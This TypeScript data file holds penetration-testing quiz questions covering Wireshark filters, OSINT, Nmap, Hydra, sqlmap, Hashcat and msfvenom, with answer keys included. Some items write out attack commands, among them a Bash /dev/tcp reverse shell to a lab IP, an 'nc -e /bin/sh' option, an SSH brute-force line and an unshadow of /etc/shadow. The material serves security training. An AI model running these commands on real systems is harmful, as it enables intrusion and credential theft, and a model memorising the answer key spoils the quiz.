export interface QuizOption {
  id: string;
  text: string;
  isCorrect: boolean;
  explanation: string;
}

export interface QuizQuestion {
  id: string;
  category:
    | "Wireshark & Packet Analysis"
    | "Information Gathering & OSINT"
    | "Network Scanning & Enumeration"
    | "Web Exploitation & Brute-Forcing"
    | "Password Cracking & Shells";
  difficulty: "Easy" | "Medium" | "Hard";
  question: string;
  scenario?: string;
  options: QuizOption[];
  explanation: string;
  toolReference: string;
}

export const QUIZ_CATEGORIES = [
  "All Categories",
  "Wireshark & Packet Analysis",
  "Information Gathering & OSINT",
  "Network Scanning & Enumeration",
  "Web Exploitation & Brute-Forcing",
  "Password Cracking & Shells",
] as const;

export const QUIZ_QUESTIONS: QuizQuestion[] = [
  // ==========================================
  // WIRESHARK & PACKET ANALYSIS
  // ==========================================
  {
    id: "q-ws-01",
    category: "Wireshark & Packet Analysis",
    difficulty: "Easy",
    question: "Which Wireshark display filter will isolate packets originating strictly from source IP 192.168.244.129?",
    scenario: "You are analyzing a PCAP file and need to investigate outbound connection attempts from host 192.168.244.129.",
    options: [
      { id: "a", text: "ip.addr == 192.168.244.129", isCorrect: false, explanation: "ip.addr matches both source and destination IPs." },
      { id: "b", text: "ip.src == 192.168.244.129", isCorrect: true, explanation: "ip.src strictly filters packets where 192.168.244.129 is the source IP address." },
      { id: "c", text: "ip.dst == 192.168.244.129", isCorrect: false, explanation: "ip.dst filters packets sent to the destination IP." },
      { id: "d", text: "eth.src == 192.168.244.129", isCorrect: false, explanation: "eth.src expects a Hardware MAC address, not an IP address." },
    ],
    explanation: "In Wireshark display filters, `ip.src` matches only the source IP field in the IP header, while `ip.addr` matches either source or destination.",
    toolReference: "Wireshark / TShark (ip.src)",
  },
  {
    id: "q-ws-02",
    category: "Wireshark & Packet Analysis",
    difficulty: "Medium",
    question: "What does the TCP flag hexadecimal filter `tcp.flags == 0x02` isolate in Wireshark?",
    scenario: "Security analysts monitor network traffic for stealthy port scans or new connection initiations.",
    options: [
      { id: "a", text: "RST (Reset) packets only", isCorrect: false, explanation: "RST only is tcp.flags == 0x04." },
      { id: "b", text: "SYN (Synchronize) packets only", isCorrect: true, explanation: "0x02 has only bit 1 set (SYN flag), which indicates TCP connection initiation or SYN port scans." },
      { id: "c", text: "SYN-ACK handshake acknowledgment packets", isCorrect: false, explanation: "SYN-ACK is tcp.flags == 0x12 (bit 1 SYN + bit 4 ACK)." },
      { id: "d", text: "RST-ACK connection resets", isCorrect: false, explanation: "RST-ACK is tcp.flags == 0x14." },
    ],
    explanation: "The TCP flag field byte uses bitmasks: bit 1 (0x02) is SYN. A filter for `tcp.flags == 0x02` finds initial SYN requests without ACK, typical of connection attempts or Nmap SYN stealth scans.",
    toolReference: "Wireshark / TShark (tcp.flags == 0x02)",
  },
  {
    id: "q-ws-03",
    category: "Wireshark & Packet Analysis",
    difficulty: "Medium",
    question: "Which filter checks unencrypted FTP traffic specifically for cleartext password login submissions?",
    scenario: "An attacker intercepted a packet capture containing legacy FTP traffic.",
    options: [
      { id: "a", text: "ftp.request.command == \"PASS\"", isCorrect: true, explanation: "FTP sends passwords via the PASS command in cleartext." },
      { id: "b", text: "ftp.response.code == 230", isCorrect: false, explanation: "Code 230 indicates successful login response from server, not the submitted password command." },
      { id: "c", text: "ftp.request.command == \"USER\"", isCorrect: false, explanation: "USER command sends the username, not the password." },
      { id: "d", text: "http contains \"password\"", isCorrect: false, explanation: "This searches HTTP packets, not FTP protocol commands." },
    ],
    explanation: "`ftp.request.command == \"PASS\"` isolates the exact packet frames containing cleartext password credentials transmitted during FTP authentication.",
    toolReference: "Wireshark / TShark (ftp.request.command == \"PASS\")",
  },
  {
    id: "q-ws-04",
    category: "Wireshark & Packet Analysis",
    difficulty: "Hard",
    question: "How do you filter Wireshark traffic to search raw packet payload bytes for the text string 'admin'?",
    scenario: "You are searching PCAP files for unencrypted HTTP or raw TCP sessions containing administrative keyword activity.",
    options: [
      { id: "a", text: "ip.payload == \"admin\"", isCorrect: false, explanation: "ip.payload is not valid string syntax for frame content search." },
      { id: "b", text: "frame contains \"admin\"", isCorrect: true, explanation: "`frame contains \"admin\"` performs a case-sensitive byte search across the entire raw packet frame payload." },
      { id: "c", text: "tcp.text == \"admin\"", isCorrect: false, explanation: "tcp.text is not a valid Wireshark filter syntax." },
      { id: "d", text: "eth.payload == \"admin\"", isCorrect: false, explanation: "Invalid Wireshark filter syntax." },
    ],
    explanation: "The `frame contains \"<string>\"` filter searches the entire layer 2 packet frame (header and payload bytes) for matching ASCII string content.",
    toolReference: "Wireshark / TShark (frame contains \"admin\")",
  },
  {
    id: "q-ws-05",
    category: "Wireshark & Packet Analysis",
    difficulty: "Easy",
    question: "Which filter expression displays ARP Request packets only?",
    scenario: "You suspect ARP spoofing/poisoning on the local subnet and want to isolate requests from replies.",
    options: [
      { id: "a", text: "arp.opcode == 1", isCorrect: true, explanation: "ARP Opcode 1 represents ARP Request; Opcode 2 represents ARP Reply." },
      { id: "b", text: "arp.opcode == 2", isCorrect: false, explanation: "Opcode 2 represents ARP Reply." },
      { id: "c", text: "arp.type == request", isCorrect: false, explanation: "Incorrect syntax; Wireshark uses numeric opcodes (arp.opcode)." },
      { id: "d", text: "eth.type == arp.request", isCorrect: false, explanation: "Incorrect Wireshark syntax." },
    ],
    explanation: "In ARP header analysis, `arp.opcode == 1` filters ARP Requests (Who has IP X?), whereas `arp.opcode == 2` filters ARP Replies (IP X is at MAC Y).",
    toolReference: "Wireshark / TShark (arp.opcode == 1)",
  },

  // ==========================================
  // INFORMATION GATHERING & OSINT
  // ==========================================
  {
    id: "q-osint-01",
    category: "Information Gathering & OSINT",
    difficulty: "Easy",
    question: "Which tool collects emails, subdomains, employee names, and open ports from public search engines like Google, Bing, and crt.sh?",
    scenario: "Performing passive OSINT during the initial reconnaissance phase of a target assessment.",
    options: [
      { id: "a", text: "theHarvester", isCorrect: true, explanation: "theHarvester gathers emails, subdomains, hosts, and names from search engines and OSINT sources." },
      { id: "b", text: "CherryTree", isCorrect: false, explanation: "CherryTree is a hierarchical note-taking app for organizing recon notes." },
      { id: "c", text: "Masscan", isCorrect: false, explanation: "Masscan is an active high-speed port scanner." },
      { id: "d", text: "sqlmap", isCorrect: false, explanation: "sqlmap is an automated SQL injection tool." },
    ],
    explanation: "`theHarvester` is the standard Kali Linux tool for gathering target OSINT (emails, hostnames, employee names) from search engines and passive databases.",
    toolReference: "theHarvester (-d <domain> -b <sources>)",
  },
  {
    id: "q-osint-02",
    category: "Information Gathering & OSINT",
    difficulty: "Medium",
    question: "What is the primary function of `subfinder` in a reconnaissance workflow?",
    scenario: "Mapping out the subdomains of target-corp.lab using passive threat intelligence feeds.",
    options: [
      { id: "a", text: "Brute-forcing web login passwords", isCorrect: false, explanation: "Hydra or Hashcat brute-forces passwords." },
      { id: "b", text: "Passive subdomain discovery across multiple public APIs", isCorrect: true, explanation: "subfinder queries passive sources like VirusTotal, CertSpotter, and ThreatCrowd to discover subdomains." },
      { id: "c", text: "Decompiling binary ELF executables", isCorrect: false, explanation: "Ghidra or objdump decompiles binaries." },
      { id: "d", text: "Intercepting HTTP request headers", isCorrect: false, explanation: "Burp Suite or OWASP ZAP intercepts headers." },
    ],
    explanation: "`subfinder` is designed specifically for passive subdomain enumeration, gathering subdomains without sending direct probe traffic to target host IP addresses.",
    toolReference: "subfinder (-d <domain>)",
  },
  {
    id: "q-osint-03",
    category: "Information Gathering & OSINT",
    difficulty: "Medium",
    question: "Which tool scans Git repositories and local source trees to detect hardcoded secrets, API tokens, and private SSH keys?",
    scenario: "Auditing a company's public GitHub repository before deployment.",
    options: [
      { id: "a", text: "GitLeaks", isCorrect: true, explanation: "GitLeaks parses commit diffs and files using regex signatures to detect leaked keys and tokens." },
      { id: "b", text: "Dnsrecon", isCorrect: false, explanation: "Dnsrecon enumerates DNS records." },
      { id: "c", text: "whatweb", isCorrect: false, explanation: "whatweb identifies web technology stacks." },
      { id: "d", text: "Fierce", isCorrect: false, explanation: "Fierce checks DNS subdomains and IP ranges." },
    ],
    explanation: "`GitLeaks` is an open-source SAST tool designed to scan Git commit histories and files for hardcoded secrets, API tokens, and credentials.",
    toolReference: "GitLeaks (gitleaks detect --source .)",
  },
  {
    id: "q-osint-04",
    category: "Information Gathering & OSINT",
    difficulty: "Easy",
    question: "What Google Dork syntax restricts search engine results exclusively to PDF documents hosted on target-corp.lab?",
    scenario: "Searching for indexed internal policy manuals or leaked organizational PDF reports.",
    options: [
      { id: "a", text: "site:target-corp.lab filetype:pdf", isCorrect: true, explanation: "`site:` restricts domain scope and `filetype:` filters file extension." },
      { id: "b", text: "inurl:pdf target-corp.lab", isCorrect: false, explanation: "inurl checks for 'pdf' string anywhere in the URL." },
      { id: "c", text: "search:pdf domain:target-corp.lab", isCorrect: false, explanation: "Invalid Google search syntax." },
      { id: "d", text: "file:pdf site:target-corp.lab", isCorrect: false, explanation: "Correct operator is `filetype:` or `ext:`." },
    ],
    explanation: "Combining `site:target-corp.lab` with `filetype:pdf` forces Google to return only indexed PDF files from that target domain.",
    toolReference: "Google Dorks (site: & filetype:)",
  },
  {
    id: "q-osint-05",
    category: "Information Gathering & OSINT",
    difficulty: "Hard",
    question: "Which web OSINT tool provides a complete aggregated database of over 3.2 billion leaked credentials (COMB)?",
    scenario: "Auditing employee credential exposure across major historical data breaches.",
    options: [
      { id: "a", text: "ProxyNova (COMB)", isCorrect: true, explanation: "ProxyNova hosts the COMB (Combination Of Many Breaches) 3.2B credential dataset lookup." },
      { id: "b", text: "DNSDumpster", isCorrect: false, explanation: "DNSDumpster provides DNS topology maps." },
      { id: "c", text: "Wayback Machine", isCorrect: false, explanation: "Wayback Machine archives historical web pages." },
      { id: "d", text: "ViewDNS.info", isCorrect: false, explanation: "ViewDNS.info offers reverse IP and WHOIS tools." },
    ],
  explanation: "ProxyNova COMB hosts the interactive dataset query engine for the 'Combination Of Many Breaches', containing 3.2+ billion breach records.",
    toolReference: "ProxyNova (COMB)",
  },

  // ==========================================
  // NETWORK SCANNING & ENUMERATION
  // ==========================================
  {
    id: "q-scan-01",
    category: "Network Scanning & Enumeration",
    difficulty: "Easy",
    question: "What is the default Nmap scan type when run with root/sudo privileges (`nmap -sS`)?",
    scenario: "Scanning target 192.168.56.101 to find open TCP ports stealthily.",
    options: [
      { id: "a", text: "TCP Connect Scan", isCorrect: false, explanation: "TCP Connect (-sT) completes the 3-way handshake and doesn't require root." },
      { id: "b", text: "SYN Stealth Scan (Half-Open)", isCorrect: true, explanation: "-sS sends SYN, receives SYN-ACK, and sends RST to avoid completing the full connection." },
      { id: "c", text: "UDP Port Scan", isCorrect: false, explanation: "UDP scan is -sU." },
      { id: "d", text: "ACK Firewall Scan", isCorrect: false, explanation: "ACK scan is -sA." },
    ],
    explanation: "`nmap -sS` performs a TCP SYN stealth scan (half-open scan). It sends a SYN packet; if SYN-ACK is returned, port is OPEN, and Nmap immediately sends a RST packet.",
    toolReference: "Nmap (-sS)",
  },
  {
    id: "q-scan-02",
    category: "Network Scanning & Enumeration",
    difficulty: "Medium",
    question: "Which Nmap flag instructs the scanner to skip ICMP host discovery ping and treat all target hosts as online?",
    scenario: "Scanning a target network behind a strict firewall that drops ICMP echo request ping packets.",
    options: [
      { id: "a", text: "-Pn", isCorrect: true, explanation: "-Pn disables ICMP ping host discovery and proceeds directly to port scanning." },
      { id: "b", text: "-sV", isCorrect: false, explanation: "-sV probes open ports for service version details." },
      { id: "c", text: "-T4", isCorrect: false, explanation: "-T4 sets timing template 4." },
      { id: "d", text: "-p-", isCorrect: false, explanation: "-p- scans all 65,535 TCP ports." },
    ],
    explanation: "`-Pn` skips the initial ping check. This is crucial when scanning firewalled targets that block ping but host open services on TCP ports.",
    toolReference: "Nmap (-Pn)",
  },
  {
    id: "q-scan-03",
    category: "Network Scanning & Enumeration",
    difficulty: "Medium",
    question: "What parameter does `masscan` use to control packet transmission rate per second for fast scanning?",
    scenario: "Performing asynchronous high-speed port scanning across a /24 subnet.",
    options: [
      { id: "a", text: "--rate=1000", isCorrect: true, explanation: "--rate specifies packets per second transmitted by Masscan." },
      { id: "b", text: "-T4", isCorrect: false, explanation: "-T4 is Nmap timing syntax." },
      { id: "c", text: "--speed=fast", isCorrect: false, explanation: "Invalid Masscan syntax." },
      { id: "d", text: "-threads 100", isCorrect: false, explanation: "Invalid Masscan flag." },
    ],
    explanation: "`masscan` uses `--rate=<number>` to set the transmit speed in packets per second (e.g., `--rate=1000` or `--rate=10000`).",
    toolReference: "Masscan (--rate)",
  },
  {
    id: "q-scan-04",
    category: "Network Scanning & Enumeration",
    difficulty: "Easy",
    question: "Which Netcat flag puts the utility into server listening mode to catch incoming reverse shell connections?",
    scenario: "Setting up a netcat handler on port 4444 to receive a shell from a target machine.",
    options: [
      { id: "a", text: "nc -lvnp 4444", isCorrect: true, explanation: "-l (listen), -v (verbose), -n (numeric IP), -p (port 4444)." },
      { id: "b", text: "nc -e /bin/sh 4444", isCorrect: false, explanation: "This executes a shell outbound." },
      { id: "c", text: "nc -z -v 4444", isCorrect: false, explanation: "-z is zero-I/O port scanning mode." },
      { id: "d", text: "nc -w 3 4444", isCorrect: false, explanation: "-w specifies timeout." },
    ],
    explanation: "`nc -lvnp 4444` starts a netcat listener: `-l` (listen mode), `-v` (verbose), `-n` (numeric IPs), `-p 4444` (port 4444).",
    toolReference: "Netcat (nc -lvnp)",
  },

  // ==========================================
  // WEB EXPLOITATION & BRUTE-FORCING
  // ==========================================
  {
    id: "q-web-01",
    category: "Web Exploitation & Brute-Forcing",
    difficulty: "Easy",
    question: "In `gobuster dir`, which flag specifies file extensions (e.g., php, html, txt) to append to wordlist items?",
    scenario: "Brute-forcing a web server to discover hidden scripts like index.php or config.json.",
    options: [
      { id: "a", text: "-x php,html,txt", isCorrect: true, explanation: "-x specifies a comma-separated list of file extensions to test." },
      { id: "b", text: "-e php,html,txt", isCorrect: false, explanation: "dirsearch uses -e, whereas Gobuster uses -x." },
      { id: "c", text: "-w php,html,txt", isCorrect: false, explanation: "-w specifies the wordlist file path." },
      { id: "d", text: "-ext php,html,txt", isCorrect: false, explanation: "Incorrect Gobuster flag syntax." },
    ],
    explanation: "In Gobuster directory mode (`gobuster dir`), `-x` defines file extensions to append to each wordlist entry.",
    toolReference: "Gobuster (-x)",
  },
  {
    id: "q-web-02",
    category: "Web Exploitation & Brute-Forcing",
    difficulty: "Medium",
    question: "Which THC Hydra command line correctly launches an SSH online password attack using username 'root' and wordlist 'rockyou.txt'?",
    scenario: "Performing password auditing against SSH service on target 192.168.56.101.",
    options: [
      { id: "a", text: "hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.101 ssh", isCorrect: true, explanation: "-l specifies single login user, -P specifies password file, followed by target IP and service name (ssh)." },
      { id: "b", text: "hydra -u root -p rockyou.txt ssh://192.168.56.101", isCorrect: false, explanation: "Hydra uses lowercase -l / -p for single items and uppercase -L / -P for wordlist files." },
      { id: "c", text: "hydra -L root -p /usr/share/wordlists/rockyou.txt 192.168.56.101 ssh", isCorrect: false, explanation: "-L expects a file of usernames, not a single string." },
      { id: "d", text: "hydra --user root --pass rockyou.txt 192.168.56.101 ssh", isCorrect: false, explanation: "Incorrect Hydra flag syntax." },
    ],
    explanation: "Hydra flag conventions: `-l` (single username), `-L` (user list file), `-p` (single password), `-P` (password list file).",
    toolReference: "Hydra (-l & -P)",
  },
  {
    id: "q-web-03",
    category: "Web Exploitation & Brute-Forcing",
    difficulty: "Medium",
    question: "Which sqlmap parameter instructs the tool to automatically extract and dump all DBMS database table entries?",
    scenario: "Exploiting a confirmed SQL injection vulnerability on DVWA or a web shop endpoint.",
    options: [
      { id: "a", text: "--dump", isCorrect: true, explanation: "--dump dumps DBMS database entries." },
      { id: "b", text: "--tables", isCorrect: false, explanation: "--tables lists table names without extracting full contents." },
      { id: "c", text: "--schema", isCorrect: false, explanation: "--schema shows structural column definitions." },
      { id: "d", text: "--extract-all", isCorrect: false, explanation: "Invalid sqlmap parameter." },
    ],
    explanation: "`sqlmap --dump` extracts and outputs database entries from backend tables once SQL injection is confirmed.",
    toolReference: "sqlmap (--dump)",
  },
  {
    id: "q-web-04",
    category: "Web Exploitation & Brute-Forcing",
    difficulty: "Hard",
    question: "What keyword placeholder does `ffuf` replace with wordlist lines during web parameter or URL fuzzing?",
    scenario: "Fuzzing a GET search parameter endpoint `http://target/search?q=FUZZ`.",
    options: [
      { id: "a", text: "FUZZ", isCorrect: true, explanation: "ffuf replaces the keyword FUZZ with lines from the wordlist." },
      { id: "b", text: "TEST", isCorrect: false, explanation: "Not the ffuf keyword." },
      { id: "c", text: "WORD", isCorrect: false, explanation: "Not the ffuf keyword." },
      { id: "d", text: "PAYLOAD", isCorrect: false, explanation: "Not the ffuf keyword." },
    ],
    explanation: "`ffuf` parses the uppercase keyword `FUZZ` in headers, URLs, or POST payloads and substitutes items from the specified wordlist file.",
    toolReference: "FFuf (FUZZ)",
  },

  // ==========================================
  // PASSWORD CRACKING & SHELLS
  // ==========================================
  {
    id: "q-pass-01",
    category: "Password Cracking & Shells",
    difficulty: "Easy",
    question: "In Hashcat, what attack mode does `-m 0` specify?",
    scenario: "Cracking legacy MD5 password hashes extracted from a web application database dump.",
    options: [
      { id: "a", text: "Standard MD5 Hash", isCorrect: true, explanation: "Hashcat mode 0 (-m 0) corresponds to MD5 hash cracking." },
      { id: "b", text: "NTLM Domain Hash", isCorrect: false, explanation: "NTLM is mode 1000 (-m 1000)." },
      { id: "c", text: "Bcrypt Hash", isCorrect: false, explanation: "Bcrypt is mode 3200 (-m 3200)." },
      { id: "d", text: "SHA-512 Unix Shadow Hash", isCorrect: false, explanation: "SHA-512 $6$ shadow is mode 1800 (-m 1800)." },
    ],
    explanation: "Hashcat hash mode numbers: `-m 0` = MD5, `-m 1000` = NTLM, `-m 1800` = SHA-512 ($6$), `-m 3200` = Bcrypt ($2a$/$2b$).",
    toolReference: "Hashcat (-m 0)",
  },
  {
    id: "q-pass-02",
    category: "Password Cracking & Shells",
    difficulty: "Medium",
    question: "Which utility combines Linux `/etc/passwd` and `/etc/shadow` into a readable format for John the Ripper?",
    scenario: "Cracking Linux user shadow passwords offline using John the Ripper.",
    options: [
      { id: "a", text: "unshadow", isCorrect: true, explanation: "unshadow /etc/passwd /etc/shadow combines user metadata and password hashes into a single file." },
      { id: "b", text: "concat-shadow", isCorrect: false, explanation: "Invalid utility." },
      { id: "c", text: "shadow-merge", isCorrect: false, explanation: "Invalid utility." },
      { id: "d", text: "john-convert", isCorrect: false, explanation: "Invalid utility." },
    ],
    explanation: "`unshadow /etc/passwd /etc/shadow > unshadowed.txt` creates the output file format expected by John the Ripper for Linux password cracking.",
    toolReference: "John the Ripper (unshadow)",
  },
  {
    id: "q-pass-03",
    category: "Password Cracking & Shells",
    difficulty: "Hard",
    question: "Which Msfvenom flag specifies the target output binary format when generating a Linux standalone payload file?",
    scenario: "Generating an executable reverse TCP shell binary for a Linux target system.",
    options: [
      { id: "a", text: "-f elf", isCorrect: true, explanation: "-f elf specifies the Executable and Linkable Format (ELF) for Linux binaries." },
      { id: "b", text: "-f exe", isCorrect: false, explanation: "-f exe generates a Windows Portable Executable (EXE)." },
      { id: "c", text: "-f raw", isCorrect: false, explanation: "-f raw generates raw shellcode bytes." },
      { id: "d", text: "-f bin", isCorrect: false, explanation: "Incorrect format tag for Linux executables." },
    ],
    explanation: "In Msfvenom, `-f elf` outputs a native Linux executable binary, whereas `-f exe` outputs a Windows binary.",
    toolReference: "Msfvenom (-f elf)",
  },
  {
    id: "q-pass-04",
    category: "Password Cracking & Shells",
    difficulty: "Medium",
    question: "What does the standard Bash reverse shell redirection command `bash -i >& /dev/tcp/192.168.56.1/4444 0>&1` accomplish?",
    scenario: "Executing a one-liner reverse shell payload on an exploited Linux web server.",
    options: [
      { id: "a", text: "Redirects interactive shell stdin, stdout, and stderr to attacker TCP IP on port 4444", isCorrect: true, explanation: "It connects back to the listener on 192.168.56.1:4444 and attaches an interactive Bash shell session." },
      { id: "b", text: "Starts an SSH server on port 4444", isCorrect: false, explanation: "It establishes an outbound TCP socket to an active listener, not a local server." },
      { id: "c", text: "Launches a DOS attack on port 4444", isCorrect: false, explanation: "It is a reverse shell payload, not a DOS tool." },
      { id: "d", text: "Encrypts all local files in /dev/tcp", isCorrect: false, explanation: "/dev/tcp is a virtual Bash device for network sockets." },
    ],
    explanation: "This classic Bash one-liner opens an interactive subshell (`bash -i`), redirects standard output/error (`>&`), connects via virtual `/dev/tcp` socket to the listener IP and port, and connects stdin (`0>&1`).",
    toolReference: "Bash One-Liner Reverse Shell",
  },
];
